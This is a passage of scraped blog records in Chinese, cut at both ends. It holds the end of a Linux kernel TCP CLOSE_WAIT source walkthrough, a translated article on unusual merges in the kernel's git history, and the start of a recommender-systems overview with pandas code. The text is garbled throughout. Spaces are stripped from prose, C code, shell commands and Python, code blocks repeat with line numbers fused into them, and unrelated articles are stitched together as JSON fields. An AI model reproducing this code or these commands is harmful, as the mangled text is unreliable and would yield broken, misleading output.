wsk_schedule(tw,&amp;tcp_death_row,time,TCP_TIMEWAIT_LEN);//设置sk状态为TCP_CLOSE,然后回收sk资源tcp_done(sk);}12345678910voidtcp_time_wait(structsock*sk,intstate,inttimeo){//建立inet_timewait_socktw=inet_twsk_alloc(sk,state);//放到bucket的具体位置等待定时器删除inet_twsk_schedule(tw,&amp;tcp_death_row,time,TCP_TIMEWAIT_LEN);//设置sk状态为TCP_CLOSE,然后回收sk资源tcp_done(sk);}具体的定时器操作函数为inet_twdr_twcal_tick,这边就不做描述了被动关闭close_wait在tcp的socket时候，如果是established状态，接收到了对端的FIN,则是被动关闭状态,会进入close_wait状态,如下图Step1所示:具体代码如下所示:tcp_rcv_state_process|-tcp_data_queuestaticvoidtcp_data_queue(structsock*sk,structsk_buff*skb){...if(th-&gt;fin)tcp_fin(skb,sk,th);...}12345678910tcp_rcv_state_process|-tcp_data_queuestaticvoidtcp_data_queue(structsock*sk,structsk_buff*skb){...if(th-&gt;fin)tcp_fin(skb,sk,th);...}我们再看下tcp_finstaticvoidtcp_fin(structsk_buff*skb,structsock*sk,structtcphdr*th){......//这一句表明当前socket有ack需要发送inet_csk_schedule_ack(sk);......switch(sk-&gt;sk_state){caseTCP_SYN_RECV:caseTCP_ESTABLISHED:/*MovetoCLOSE_WAIT*///状态设置程close_wait状态tcp_set_state(sk,TCP_CLOSE_WAIT);//这一句表明，当前fin可以延迟发送//即和后面的数据一起发送或者定时器到时后发送inet_csk(sk)-&gt;icsk_ack.pingpong=1;break;}......}1234567891011121314151617181920staticvoidtcp_fin(structsk_buff*skb,structsock*sk,structtcphdr*th){......//这一句表明当前socket有ack需要发送inet_csk_schedule_ack(sk);......switch(sk-&gt;sk_state){caseTCP_SYN_RECV:caseTCP_ESTABLISHED:/*MovetoCLOSE_WAIT*///状态设置程close_wait状态tcp_set_state(sk,TCP_CLOSE_WAIT);//这一句表明，当前fin可以延迟发送//即和后面的数据一起发送或者定时器到时后发送inet_csk(sk)-&gt;icsk_ack.pingpong=1;break;}......}这边有意思的点是，收到对端的fin之后并不会立即发送ack告知对端收到了，而是等有数据携带一块发送,或者等携带重传定时器到期后发送ack。如果对端关闭了，应用端在read的时候得到的返回值是0,此时就应该手动调用close去关闭连接if(recv(sockfd,buf,MAXLINE,0)==0){close(sockfd)}1234if(recv(sockfd,buf,MAXLINE,0)==0){close(sockfd)}我们看下recv是怎么处理fin包，从而返回0的,上一篇博客可知，recv最后调用tcp_rcvmsg,由于比较复杂，我们分两段来看:tcp_recvmsg第一段......//从接收队列里面获取一个sk_bufferskb=skb_peek(&amp;sk-&gt;sk_receive_queue);do{//如果已经没有数据，直接跳出读取循环，返回0if(!skb)break;......//*seq表示已经读到多少seq//TCP_SKB_CB(skb)-&gt;seq表示当前sk_buffer的起始seq//offset即是在当前sk_buffer中已经读取的长度offset=*seq-TCP_SKB_CB(skb)-&gt;seq;//syn处理if(tcp_hdr(skb)-&gt;syn)offset--;//此处判断表示，当前skb还有数据可读，跳转found_ok_skbif(offset&lt;skb-&gt;len)gotofound_ok_skb;//处理fin包的情况//offset==skb-&gt;len,跳转到found_fin_ok然后跳出外面的大循环//并返回0if(tcp_hdr(skb)-&gt;fin)gotofound_fin_ok;BUG_TRAP(flags&amp;MSG_PEEK);skb=skb-&gt;next;}while(skb!=(structsk_buff*)&amp;sk-&gt;sk_receive_queue);......12345678910111213141516171819202122232425262728......//从接收队列里面获取一个sk_bufferskb=skb_peek(&amp;sk-&gt;sk_receive_queue);do{//如果已经没有数据，直接跳出读取循环，返回0if(!skb)break;......//*seq表示已经读到多少seq//TCP_SKB_CB(skb)-&gt;seq表示当前sk_buffer的起始seq//offset即是在当前sk_buffer中已经读取的长度offset=*seq-TCP_SKB_CB(skb)-&gt;seq;//syn处理if(tcp_hdr(skb)-&gt;syn)offset--;//此处判断表示，当前skb还有数据可读，跳转found_ok_skbif(offset&lt;skb-&gt;len)gotofound_ok_skb;//处理fin包的情况//offset==skb-&gt;len,跳转到found_fin_ok然后跳出外面的大循环//并返回0if(tcp_hdr(skb)-&gt;fin)gotofound_fin_ok;BUG_TRAP(flags&amp;MSG_PEEK);skb=skb-&gt;next;}while(skb!=(structsk_buff*)&amp;sk-&gt;sk_receive_queue);......上面代码的处理过程如下图所示:我们看下tcp_recmsg的第二段:found_ok_skb://tcp已读seq更新*seq+=used;//这次读取的数量更新copied+=used;//如果还没有读到当前sk_buffer的尽头，则不检测fin标识if(used+offset&lt;skb-&gt;len)continue;//如果发现当前skb有fin标识，去found_fin_okif(tcp_hdr(skb)-&gt;fin)gotofound_fin_ok;......found_fin_ok:/*ProcesstheFIN.*///tcp已读seq++++*seq;...break;}while(len&gt;0);1234567891011121314151617181920found_ok_skb://tcp已读seq更新*seq+=used;//这次读取的数量更新copied+=used;//如果还没有读到当前sk_buffer的尽头，则不检测fin标识if(used+offset&lt;skb-&gt;len)continue;//如果发现当前skb有fin标识，去found_fin_okif(tcp_hdr(skb)-&gt;fin)gotofound_fin_ok;......found_fin_ok:/*ProcesstheFIN.*///tcp已读seq++++*seq;...break;}while(len&gt;0);由上面代码可知，一旦当前skb读完了而且携带有fin标识，则不管有没有读到用户期望的字节数量都会返回已读到的字节数。下一次再读取的时候则在刚才描述的tcp_rcvmsg上半段直接不读取任何数据再跳转到found_fin_ok并返回0。这样应用就能感知到对端已经关闭了。如下图所示:last_ack应用层在发现对端关闭之后已经是close_wait状态，这时候再调用close的话，会将状态改为last_ack状态，并发送本端的fin,如下代码所示:voidtcp_close(structsock*sk,longtimeout){......elseif(tcp_close_state(sk)){//tcp_close_state会将sk从close_wait状态变为last_ack//发送fin包tcp_send_fin(sk);}}12345678910voidtcp_close(structsock*sk,longtimeout){......elseif(tcp_close_state(sk)){//tcp_close_state会将sk从close_wait状态变为last_ack//发送fin包tcp_send_fin(sk);}}在接收到主动关闭端的last_ack之后，则调用tcp_done(sk)设置sk为tcp_closed状态，并回收sk的资源,如下代码所示:tcp_v4_do_rcv|-tcp_rcv_state_processinttcp_rcv_state_process(structsock*sk,structsk_buff*skb,structtcphdr*th,unsignedlen){....../*step5:checktheACKfield*/if(th-&gt;ack){...caseTCP_LAST_ACK://这处判断是确认此ack是发送Fin包对应的那个ackif(tp-&gt;snd_una==tp-&gt;write_seq){tcp_update_metrics(sk);//设置socket为closed，并回收socket的资源tcp_done(sk);gotodiscard;}...}}1234567891011121314151617181920tcp_v4_do_rcv|-tcp_rcv_state_processinttcp_rcv_state_process(structsock*sk,structsk_buff*skb,structtcphdr*th,unsignedlen){....../*step5:checktheACKfield*/if(th-&gt;ack){...caseTCP_LAST_ACK://这处判断是确认此ack是发送Fin包对应的那个ackif(tp-&gt;snd_una==tp-&gt;write_seq){tcp_update_metrics(sk);//设置socket为closed，并回收socket的资源tcp_done(sk);gotodiscard;}...}}上述代码就是被动关闭端的后两次挥手了,如下图所示:出现大量close_wait的情况linux中出现大量close_wait的情况一般是应用在检测到对端fin时没有及时close当前连接。有一种可能如下图所示:当出现这种情况，通常是minIdle之类参数的配置不对(如果连接池有定时收缩连接功能的话)。给连接池加上心跳也可以解决这种问题。如果应用close的时间过晚，对端已经将连接给销毁。则应用发送给fin给对端，对端会由于找不到对应的连接而发送一个RST(Reset)报文。操作系统何时回收close_wait如果应用迟迟没有调用close_wait,那么操作系统有没有一个回收机制呢，答案是有的。tcp本身有一个包活(keepalive)定时器，在(keepalive)定时器超时之后，会强行将此连接关闭。可以设置tcpkeepalive的时间/etc/sysctl.confnet.ipv4.tcp_keepalive_intvl=75net.ipv4.tcp_keepalive_probes=9net.ipv4.tcp_keepalive_time=720012345/etc/sysctl.confnet.ipv4.tcp_keepalive_intvl=75net.ipv4.tcp_keepalive_probes=9net.ipv4.tcp_keepalive_time=7200默认值如上面所示，设置的很大，7200s后超时，如果想快速回收close_wait可以设置小一点。但最终解决方案还是得从应用程序着手。关于tcpkeepalive包活定时器可见笔者另一篇博客:https://my.oschina.net/alchemystar/blog/833981进程关闭时清理socket资源进程在退出时候(无论kill,kill-9或是正常退出)都会关闭当前进程中所有的fd(文件描述符)do_exit|-exit_files|-__exit_files|-close_files|-filp_close123456do_exit|-exit_files|-__exit_files|-close_files|-filp_close这样我们又回到了博客伊始的filp_close函数，对每一个是socket的fd发送send_finJavaGC时清理socket资源Java的socket最终关联到AbstractPlainSocketImpl,且其重写了object的finalize方法abstractclassAbstractPlainSocketImplextendsSocketImpl{....../***Cleansupiftheuserforgetstocloseit.*/protectedvoidfinalize()throwsIOException{close()}......}123456789101112abstractclassAbstractPlainSocketImplextendsSocketImpl{....../***Cleansupiftheuserforgetstocloseit.*/protectedvoidfinalize()throwsIOException{close()}......}所以Java会在GC时刻会关闭没有被引用的socket,但是切记不要寄希望于Java的GC,因为GC时刻并不是以未引用的socket数量来判断的，所以有可能泄露了一堆socket,但仍旧没有触发GC。总结linux内核源代码博大精深，阅读其代码很费周折。之前读《TCP/IP详解卷二》的时候由于有先辈引导和梳理，所以看书中所使用的BSD源码并不觉得十分费劲。直到现在自己带着问题独立看linux源码的时候，尽管有之前的基础，仍旧被其中的各种细节所迷惑。希望笔者这篇文章能帮助到阅读linux网络协议栈代码的人。1赞1收藏1评论", "url_object_id": "2f3d9b3bdf956b9f6b37c1e046ec7931"},{"title": "Linux 内核 Git 历史记录中，最大最奇怪的提交信息是这样的", "url": "http://blog.jobbole.com/114256/", "create_date": "2018-09-13", "front_image_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3gy1fu22uq61vrj20mr0d040p.jpg"], "praise_nums": 1, "fav_nums": 2, "comments_nums": 1, "tags": "2,0,1,8,/,0,8,/,0,8, ,·", "content": "本文由伯乐在线-可乐翻译，艾凌风校稿。未经许可，禁止转载！英文出处：destroyallsoftware。欢迎加入翻译组。我们通常认为gitmerges有两个父节点。例如，由我写的最新的Linux内核合并操作是提交2c5d955,这是4.10-rc6版本发行前准备工作的一部分。它有两个父节点:2c5d955Mergebranch'parisc-4.10-3'of...|*-2ad5d52parisc:Don'tuseBITS_PER_LONGinuse...*-53cd1adMergebranch'i2c/for-current'of...12342c5d955Mergebranch'parisc-4.10-3'of...|*-2ad5d52parisc:Don'tuseBITS_PER_LONGinuse...*-53cd1adMergebranch'i2c/for-current'of...Git还支持章鱼式的合并，这意味着可以有超过两个父节点的合并。这对于我们那些从事小型项目开发的人来说，这似乎很奇怪：与三四个父节点合并会不会令人感到困惑？这得看情况而定。有时候，一个内核的维护者需要一次同时合并几十个单独的历史记录。一个接着一个的30个合并提交比起单独的一个30路(30个父节点)合并更加令人困惑，特别是当30路合并没有冲突的时候。章鱼式合并可能比你想象地更常见。在内核的提交历史记录中有649,306个提交。其中46,930(7.2%)个提交是合并提交。在合并提交中，有1,549(3.3%)是章鱼式合并。(截止到我当前的gitHEAD指向的提交566cf87。)$gitlog--oneline|wc-l649306$gitlog--oneline--merges|wc-l46930$gitlog--oneline--min-parents=3|wc-l1549123456$gitlog--oneline|wc-l649306$gitlog--oneline--merges|wc-l46930$gitlog--oneline--min-parents=3|wc-l1549作为比较，Rails的所有提交中的20%是合并提交(12,401/63,111),但没有一个章鱼式合并。Rails大概更能代表一般的工程;我认为大多数的git用户甚至都不知道章鱼式合并。现在，显而易见的问题是:这些章鱼式合并的规模有多大？在这里每行开头的“&gt;”是续行符；这个命令写了总共5行。这篇文章中的所有命令都是我在做实验的时候输入到终端里面的，所以它们未必容易看懂。我对于结果更感兴趣，贴出代码只是为了满足那些好奇的人。$(gitlog--min-parents=2--pretty='format:%h%P'|&gt;ruby-ne'/^(w+)(.*)$/=~$_;puts\"#{$2.split.count}#{$1}\"'|&gt;sort-n|&gt;tail-1)662cde51f12345$(gitlog--min-parents=2--pretty='format:%h%P'|&gt;ruby-ne'/^(w+)(.*)$/=~$_;puts\"#{$2.split.count}#{$1}\"'|&gt;sort-n|&gt;tail-1)662cde51f66个父节点！这么多的父节点，这个提交到底发生了什么？$gitlog-12cde51fcommit2cde51fbd0f310c8a2c5f977e665c0ac3945b46dMerge:7471c5cc097d5f74c375c04c3a855095f554f534772f54d2a56d37d8192043cf467a0fbbe58033990c51d754fa9516ea4b69ae84825c1a63f52c919111bd7baafa85edd407a371467e40f7f3d18778ac60406a40308a0f32650bc48cb7a36323702bef749403cec15972aa62b328089a11db0dae1771bcf60e547a010ff65e8154358381da626bcac38136bd06b2bd28c5178f8e6ad35008ef94f58c4fc42309d675c15371b65ab7326090a89ea6fbc2c486431769267f3f9a60f25cf343f30026fbbf7fec3e8494e40e0b550c969763587110112b62a0a0591b888edbd44008b9a199b8784cbf8Author:MarkBrown&lt;[emailredactedforprivacy]&gt;Date:ThuJan213:01:552014+0000Mergeremote-trackingbranches[65remotebranchnames]12345678910111213141516$gitlog-12cde51fcommit2cde51fbd0f310c8a2c5f977e665c0ac3945b46dMerge:7471c5cc097d5f74c375c04c3a855095f554f534772f54d2a56d37d8192043cf467a0fbbe58033990c51d754fa9516ea4b69ae84825c1a63f52c919111bd7baafa85edd407a371467e40f7f3d18778ac60406a40308a0f32650bc48cb7a36323702bef749403cec15972aa62b328089a11db0dae1771bcf60e547a010ff65e8154358381da626bcac38136bd06b2bd28c5178f8e6ad35008ef94f58c4fc42309d675c15371b65ab7326090a89ea6fbc2c486431769267f3f9a60f25cf343f30026fbbf7fec3e8494e40e0b550c969763587110112b62a0a0591b888edbd44008b9a199b8784cbf8Author:MarkBrown&lt;[emailredactedforprivacy]&gt;Date:ThuJan213:01:552014+0000Mergeremote-trackingbranches[65remotebranchnames]这让许多历史记录可视化工具都无法正常运行，引出了LinusTorvalds的一个回应:我刚刚从Takashi那收到了一些消息，因此我看到了你的合并提交2cde51fbd0f3。这个提交有66个父节点。[…]它被拉取（pulled）了，并且状况良好，但显然它在“章鱼式合并很好”和“上帝”之间做到了平衡，这不是一个章鱼式合并，这是一个克苏鲁(一个章鱼头人神的巨人)式的合并。正如我所看到的，这个有66个父节点的不同寻常的提交在某种程度上只是对于ASoc代码修改的正常合并。ASoc代表了芯片上的ALSA系统。ALSA系统是音频子系统；“单片系统是集成在单片硅芯片上计算机的术语。综上所述，ASoc是对嵌入式设备的声音支持系统。那么这样的合并多久会发生一次呢？永远都不会发生。规模排第二的合并是fa623d1,它仅仅有30个父节点。然而，因为足够的背景知识，从30到66之间的巨大差距并不会令人感到惊讶。一次git提交的父节点的数量大概是一种单侧分布(通常非正式的说法是幂律分布，因为这里对这个不感兴趣，所以不必严格正确)。软件系统的许多属性都属于单侧分布。等一下；我将会生成一个图表来确定…(大量严格的图表确定了)。是的，它确实是单侧分布:简单地说来,“单侧分布”意味着小事件比大事件多得多，而且大事件的最大规模是没有界限的。内核的提交历史中包含了45,381个两个父节点的合并，但仅仅有一个66个父节点的合并。假如考虑足够多的开发历史记录的话，我们可能会看到多于66个父节点的合并。单个函数或是单个模块的代码行数也是单侧分布（大多数函数和模块都很小，但是其中一些很大；想想webapp中的“User”类)。同样，对于模块的变化率（大多数模块都不会经常变动，只有其中一些会不断改动；再想想“User”类）。这些分布在软件开发中无处不在，而且经常在下面的双对数坐标图中呈直线分布。对于父节点的数量最大的提交，我们就讨论到这。那么在差异方面的合并又怎样呢？在差异方面，我的意思是被合并的两个分支之间的差异。我们可以通过简单地比较合并节点的父节点，然后统计它们差异的行数来衡量这一点。例如，如果一个分支一年前从master分支分离出去，改变了一行代码，之后被合并回master分支，在这段时间内对于master分支的所有修改都会被统计到，同样分离出去的分支上的改变也会被统计到。我们可以引出更直观的差异概念，但因为git不会保留分支的元数据，所以它们很难或者说是几乎不可能计算出来。在任何情况下，作为计算差异的起点，下面是最近内核合并的差异：$gitdiff$(gitlog--merges-1--pretty='format:%P')|wc-l17312$gitdiff$(gitlog--merges-1--pretty='format:%P')|wc-l173在英语中，这个命令的含义是这样的：“比较最近合并的两个父节点，然后统计差异的行数。”为了找出差异最多的合并，我们可以遍历每个合并提交，用类似的方法统计差异的行数。然后，作为一个测试，我们将搜索所有合并中恰好有2,000行差异的分支。$(gitlog--merges--pretty=\"%h\"|whilereadx;doecho\"$(gitdiff$(gitlog--pretty=%P$x-1)|wc-l)\"$xdone&gt;merges.txt)$sort-nmerges.txt|grep'b2000b'20003d6ce3320007fedd7e2000f33f6f012345678$(gitlog--merges--pretty=\"%h\"|whilereadx;doecho\"$(gitdiff$(gitlog--pretty=%P$x-1)|wc-l)\"$xdone&gt;merges.txt)$sort-nmerges.txt|grep'b2000b'20003d6ce3320007fedd7e2000f33f6f0（这个命令需要花费很长的时间运行:我想大约需要12小时，尽管我已经减少了许多。）我认为合并的差异大小遵循单侧分布，就像父节点数量的统计一样。所以它应该在双对数坐标图表中显示为一条直线。让我检查一下….对了:我把差异的大小定在1000行左右(注：前面用2000行，得到的数据太少)，否则没有足够的样本来生成有效的曲线。右下角难看的原因部分是因为量化问题，另一部分是由于缺乏大量的提交导致样本数量较小，与之前的图表情况一样。现在，显而易见的问题是:提交历史中差异最大的合并是哪个？$sort-nmerges.txt|tail-122445760f44dd1812$sort-nmerges.txt|tail-122445760f44dd1822,445,760行差异！这看起来根本不可能这么大-因为差异的行数比整个内核源代码的行数都大。GregKroah-Hartman在2016年9月19做了这一提交，当时正处在4.8-rc6版本的开发期间。Greg是LinusTorvalds的“副官”之一–他（Linus）最亲近，最值得信赖的开发者。简单地说，副官们构成了内核pullrequest树中的第一层。Greg负责维护内核的稳定分支，驱动程序内核，USB子系统和其他几个子系统。在更加仔细的研究这个合并之前，我们需要一点背景知识。通常我们把合并作为菱形分支模式（先分支，然后合并，见下图）的一部分:A/BC/D12345A/BC/D在2014年，Greg开始在一个新的仓库开发Greybus(移动设备总线)，这就好像是他创建了一个全新的项目一样。最后，Greybus的开发工作完成时，它就被合并到了内核中。但因为它是从一个崭新的仓库开始的，所以它和内核的中的其他源代码没有共同的历史记录。所以除了2005年我们公认的初始提交之外，这个合并为内核又添加了一个“初始提交”。这个仓库现在有两条独立的初始提交，而不是通常的菱形分支模式：A/BC123A/BC通过查看合并提交的两个父节点中分别存在多少文件，我们可以看到一些蛛丝马迹:$gitlog-1f44dd18|grep'Merge:'Merge:93954527398a66$gitls-tree-r9395452|wc-l55499$gitls-tree-r7398a66|wc-l148123456$gitlog-1f44dd18|grep'Merge:'Merge:93954527398a66$gitls-tree-r9395452|wc-l55499$gitls-tree-r7398a66|wc-l148一条分支存在大量的文件，因为它包含了整个内核的源文件。而另一条仅仅包含了很少的文件，因为它包含的只是Greybus的历史记录。像章鱼式合并一样，这会让一些git用户感到奇怪。但是内核开发人员是专家级的git用户，并倾向于放弃使用这个功能，但绝对不是盲目的放弃最后一个问题:这种情况到底发生了多少次？内核中有多少独立的“初始化”提交？事实上是四次:$gitlog--max-parents=0--pretty=\"format:%h%cd%s\"--date=shorta101ad92016-02-23Shareupstreamingpatchescd26f1b2014-08-11greybus:Initialcommitbe0e5c02007-01-26Btrfs:Initialcheckin,basicworkingtreecode1da177e2005-04-16Linux-2.6.12-rc212345$gitlog--max-parents=0--pretty=\"format:%h%cd%s\"--date=shorta101ad92016-02-23Shareupstreamingpatchescd26f1b2014-08-11greybus:Initialcommitbe0e5c02007-01-26Btrfs:Initialcheckin,basicworkingtreecode1da177e2005-04-16Linux-2.6.12-rc2如果我们要画出这些提交，为了清楚起见，我们忽略所有其他的历史记录，如下图:566cf87(thecurrentHEAD)|||||||*-a101ad9Shareupstreamingpatches|||||*-cd26f1bgreybus:Initialcommit|||*-be0e5c0Btrfs:Initialcheckin,basicworkingtreecode|*-1da177eLinux-2.6.12-rc2123456789566cf87(thecurrentHEAD)|||||||*-a101ad9Shareupstreamingpatches|||||*-cd26f1bgreybus:Initialcommit|||*-be0e5c0Btrfs:Initialcheckin,basicworkingtreecode|*-1da177eLinux-2.6.12-rc2这四个提交中的每一个都是离当前内核版本库HEAD节点很遥远的祖先节点，并且都没有父节点。从git的角度来看，内核历史“开始”了不同的四次，所有的这些提交最终都被合并在一起。这四个提交中的第一个（在我们输出的底部）是2005年的初始化提交，也就是我们通常认为的初始化提交。第二个是文件系统btrfs的开发，它是独立仓库完成的。第三个是Greybus,同样也是独立仓库完成的，我们之前已经说过。第四个初始化提交，a101ad9，很奇怪，正如下面看到的:$gitshow--oneline--stata101ad9a101ad9ShareupstreamingpatchesREADME.md|2++1filechanged,2insertions(+)1234$gitshow--oneline--stata101ad9a101ad9ShareupstreamingpatchesREADME.md|2++1filechanged,2insertions(+)它刚创建了一个README.md文件。但随后，它就立即被合并到正常的内核历史的提交e5451c8中了！$gitshowe5451c8commite5451c8f8330e03ad3cfa16048b4daf961af434fMerge:a101ad93cf42efAuthor:LaxmanDewangan&lt;ldewangan@nvidia.com&gt;Date:TueFeb2319:37:082016+053012345$gitshowe5451c8commite5451c8f8330e03ad3cfa16048b4daf961af434fMerge:a101ad93cf42efAuthor:LaxmanDewangan&lt;ldewangan@nvidia.com&gt;Date:TueFeb2319:37:082016+0530为什么有人会创建一个只包含两行文本的README文件的初始化提交，然后立即合并到主线的历史记录中呢？我想不出任何理由，所以我怀疑这是一个意外！但它没有造成任何危害；它只是很奇怪。（更新：这是个意外，Linus用他一贯的方式回应了。）顺便提一句，这也是历史记录中差异数量排第二的提交，仅仅因为它是一个不相关提交的合并，就像我们仔细研究过的Greybus的合并一样。现在你知道了：Linux内核的git历史记录一些最奇怪的事情。一共有1,549个章鱼式合并，其中有一个是拥有66个父节点的提交。差异最多的合并有22,445,760行差异，尽管它有点技术性因为它和仓库的其他部分没有公共的历史记录。内核拥有四个独立的初始化提交，其中一个是失误导致的。尽管上面的这些都不会出现在绝大多数的git仓库中，但是所有的这些功能都是在git的设计范围之内的。1赞2收藏1评论关于作者：可乐本科在读，对python,linux,安全很感兴趣，希望能够阅读国外最新的技术新闻，也希望能够翻译一些文章帮助到别人个人主页·我的文章·11·", "url_object_id": "104d59a019864897b6fa5022b135f05e"},{"title": "推荐系统概述", "url": "http://blog.jobbole.com/114167/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/1a58c225e4d199c6b01c7dcec81cea65.png"], "praise_nums": 4, "fav_nums": 9, "comments_nums": 2, "tags": "2,0,1,8,/,0,7,/,3,0, ,·", "content": "本文由伯乐在线-Marticles翻译，小米云豆粥校稿。未经许可，禁止转载！英文出处：TobyDaigle。欢迎加入翻译组。“聆忠言者众，惟智者受益。”—哈珀·李许多人把推荐系统视为一种神秘的存在，他们觉得推荐系统似乎知道我们的想法是什么。Netflix向我们推荐电影，还有亚马逊向我们推荐该买什么样的商品。推荐系统从早期发展到现在，已经得到了很大的改进和完善，以不断地提高用户体验。尽管推荐系统中许多都是非常复杂的系统，但其背后的基本思想依然十分简单。推荐系统是什么？推荐系统是信息过滤系统的一个子类，它根据用户的偏好和行为，来向用户呈现他(或她)可能感兴趣的物品。推荐系统会尝试去预测你对一个物品的喜好，以此向你推荐一个你很有可能会喜欢的物品。如何构建一个推荐系统？现在已经有很多种技术来建立一个推荐系统了，我选择向你们介绍其中最简单，也是最常用的三种。他们是：一，协同过滤；二，基于内容的推荐系统；三，基于知识的推荐系统。我会解释前面的每个系统相关的弱点，潜在的缺陷，以及如何去避免它们。最后，我在文章末尾为你们准备了一个推荐系统的完整实现。协同过滤协同过滤，是首次被用于推荐系统上的技术，至今仍是最简单且最有效的。协同过滤的过程分为这三步：一开始，收集用户信息，然后以此生成矩阵来计算用户关联，最后作出高可信度的推荐。这种技术分为两大类：一种基于用户，另一种则是基于组成环境的物品。基于用户的协同过滤基于用户的协同过滤本质上是寻找与我们的目标用户具有相似品味的用户。如果Jean-Pierre和Jason曾对几部电影给出了相似的评分，那么我们认为他们就是相似的用户，接着我们就可以使用JeanPierre的评分来预测Jason的未知评分。例如，如果Jean-Pierre喜欢星球大战3:绝地武士归来和星球大战5:帝国反击战，Jason也喜欢绝地武士归来，那么帝国反击战对Jason来说是就是一个很好的推荐。一般来说，你只需要一小部分与Jason相似的用户来预测他的评价。在下表中，每行代表一个用户，每列代表一部电影，只需简单地查找这个矩阵中行之间的相似度，就可以找到相似的用户了。然而，基于用户的协同过滤在实现中存在一些以下问题：用户偏好会随时间的推移而改变，推荐系统生成的许多推荐可能会随之变得过时。用户的数量越多，生成推荐的时间就越长。基于用户会导致对托攻击敏感，这种攻击方法是指恶意人员通过绕过推荐系统，使得特定物品的排名高于其他物品。(托攻击即ShillingAttack,是一种针对协同过滤根据近邻偏好产生推荐的特点，恶意注入伪造的用户模型，推高或打压目标排名，从而达到改变推荐系统结果的攻击方式)基于物品的协同过滤基于物品的协同过滤过程很简单。两个物品的相似性基于用户给出的评分来算出。让我们回到Jean-Pierre与Jason的例子，他们两人都喜欢“绝地武士归来”和“帝国反击战”。因此，我们可以推断，喜欢第一部电影的大多数用户也可能会喜欢第二部电影。所以，对于喜欢“绝地武士归来”的第三个人Larry来说，”帝国反击战“的推荐将是有意义的。所以，这里的相似度是根据列而不是行来计算的(与上面的用户-电影矩阵中所见的不同)。基于物品的协同过滤常常受到青睐，因为它没有任何基于用户的协同过滤的缺点。首先，系统中的物品(在这个例子中物品就是电影)不会随着时间的推移而改变，所以推荐会越来越具有关联性。此外，通常推荐系统中的物品都会比用户少，这减少了推荐的处理时间。最后，考虑到没有用户能够改变系统中的物品，这种系统要更难于被欺骗或攻击。基于内容的推荐系统在基于内容的推荐系统中，元素的描述性属性被用来构成推荐。“内容Content”一词指的就是这些描述。举个例子，根据Sophie的听歌历史，推荐系统注意到她似乎喜欢乡村音乐。因此，系统可以推荐相同或相似类型的歌曲。更复杂的推荐系统能够发现多个属性之间的关系，从而产生更高质量的推荐。例如，音乐基因组计划(MusicGenomeProject)根据450个不同的属性将数据库中的每支歌曲进行分类。该项目为Pandor的歌曲推荐提供技术支持。(Pandor提供在线音乐流媒体服务，类似Spolify)基于知识的推荐系统基于知识的推荐系统在物品购买频率很低的情况下特别适用。例如房屋、汽车、金融服务甚至是昂贵的奢侈品。在这种情况下，推荐的过程中常常缺乏商品的评价。基于知识的推荐系统不使用评价来作出推荐。相反，推荐过程是基于顾客的需求和商品描述之间的相似度，或是对特定用户的需求使用约束来进行的。这使得这种类型的系统是独一无二的，因为它允许顾客明确地指定他们想要什么。关于约束，当应用时，它们大多是由该领域的专家实施的，这些专家从一开始就知道该如何实施这些约束。例如，当用户明确指出在一个特定的价格范围内寻找一个家庭住宅时，系统必须考虑到这个用户规定的约束。推荐系统中的冷启动问题推荐系统中的主要问题之一是最初可用的评价数量相对较小。当新用户还没有给电影打分，或者一部新的电影被添加到系统中时，我们该怎么做呢？在这种情况下，应用传统的协同过滤模型会更加困难。尽管基于内容和基于知识的推荐算法在面临冷启动问题时比协同过滤更具有鲁棒性，但基于内容和基于知识并不总是可用的。因此，一些新方法，比如混合系统，已经被设计出用来解决这个问题了。混合推荐系统文章到目前为止所介绍的不同类型的推荐系统都各有优劣，他们根据不同的数据给出推荐。一些推荐系统，如基于知识的推荐系统，在数据量有限的冷启动环境下最为有效。其他系统，如协同过滤，在有大量数据可用时则更加有效。在多数情况下，数据都是多样化的，我们可以为同一任务灵活采用多种方法。因此，我们可以结合多种不同技术的推荐来提高整个系统的推荐质量。许多的组合性技术已经被探索出来了，包括：加权：为推荐系统中的每种算法都赋予不同的权重，使得推荐偏向某种算法交叉：将所有的推荐结果集合在一起展现，没有偏重增强：一个系统的推荐将作为下一个系统的输入，循环直至最后一个系统为止切换：随机选择一种推荐方法混合推荐系统中的一个最有名的例子是于2006至2009年举行的NetflixPrice算法竞赛。这个竞赛的目标是将Netflix的电影推荐系统Cinematch的算法准确率提高至少10%。Bellkor’sPragmatixChaos团队用一种融合了107种不同算法的方案将Cinematch系统的推荐准确率提高了10.06%，并最终获得了100万美元奖金。你可能会对这个例子中的准确率感到好奇，准确率其实就是对电影的预测评分与实际评分接近程度的度量。推荐系统与AI？推荐系统常用于人工智能领域。推荐系统的能力–洞察力，预测事件的能力和突出关联的能力常被用于人工智能中。另一方面，机器学习技术常被用于实现推荐系统。例如，在Arcbees，我们使用了神经网络和来自IMdB的数据成功建立了一个电影评分预测系统。神经网络可以快速地执行复杂的任务并轻松地处理大量数据。通过使用电影列表作为神经网络的输入，并将神经网络的输出与用户评分进行比较，神经网络可以自我学习规则以预测特定用户的未来评分。专家建议在我读过许多资料中，我注意到有两个很重要的建议经常被推荐系统领域内的专家提及。第一，基于用户付费的物品进行推荐。当一个用户有购买意愿时，你就可以断定他的评价一定是更具有相关性与准确的。第二，使用多种算法总是比改进一种算法要好。NetflixPrize竞赛就是一个很好的例子。实现一个基于物品的推荐系统下面的代码演示了实现一个基于物品的推荐系统是多么的简单与快速。所使用的语言是Python，并使用了Pandas与Numpy这两个在推荐系统领域中最流行的库。所使用的数据是电影评分，数据集来自MovieLens。第一步：寻找相似的电影1.读取数据importpandasaspdimportnumpyasnpratings_cols=['user_id','movie_id','rating']ratings=pd.read_csv('u.data',sep='t',names=ratings_cols,usecols=range(3))movies_cols=['movie_id','title']movies=pd.read_csv('u.item',sep='|',names=movies_cols,usecols=range(2))ratings=pd.merge(ratings,movies)12345678910importpandasaspdimportnumpyasnpratings_cols=['user_id','movie_id','rating']ratings=pd.read_csv('u.data',sep='t',names=ratings_cols,usecols=range(3))movies_cols=['movie_id','title']movies=pd.read_csv('u.item',sep='|',names=movies_cols,usecols=range(2))ratings=pd.merge(ratings,movies)2.构造用户的电影矩阵movieRatings=ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')1movieRatings=ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')3.选择一部电影并生成这部电影与其他所有电影的相似度starWarsRatings=movieRatings['StarWars(1977)']similarMovies=movieRatings.corrwith(starWarsRatings)similarMovies=similarMovies.dropna()df=pd.DataFrame(similarMovies)12345starWarsRatings=movieRatin